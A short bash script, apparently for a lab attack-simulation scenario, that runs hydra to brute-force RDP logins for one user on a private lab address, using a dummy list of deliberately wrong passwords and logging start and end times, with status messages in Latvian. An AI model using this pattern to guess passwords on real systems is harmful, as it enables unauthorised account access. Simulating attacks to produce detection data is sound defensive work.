#!/bin/bash

set -euo pipefail

TARGET_IP="10.99.20.11"
USERNAME="user3"
WORDLIST="${1:-passlist.txt}"
SCENARIO_ID="${2:-rdp_bruteforce}"
LOG_FILE="scenario.log"

if [ ! -f "$WORDLIST" ]; then
  printf 'WrongPass1\nWrongPass2\nWrongPass3\nWrongPass4\nWrongPass5\nWrongPass6\n' > passlist.txt
fi

START_TIME="$(date -Is)"
echo "${START_TIME},scenario=${SCENARIO_ID},type=rdp_bruteforce,status=start,target=${TARGET_IP},user=${USERNAME},wordlist=${WORDLIST}" >> "${LOG_FILE}"

echo "[*] ${START_TIME}: Sākts RDP paroļu pārlases scenārijs ${SCENARIO_ID}"
echo "[*] Mērķis: ${TARGET_IP}  Lietotājs: ${USERNAME}  Wordlist: ${WORDLIST}"

hydra -I -l "${USERNAME}" -P "${WORDLIST}" "rdp://${TARGET_IP}"

END_TIME="$(date -Is)"
echo "${END_TIME},scenario=${SCENARIO_ID},type=rdp_bruteforce,status=end,target=${TARGET_IP},user=${USERNAME},wordlist=${WORDLIST}" >> "${LOG_FILE}"

echo "[*] ${END_TIME}: Pabeigts scenārijs ${SCENARIO_ID}"

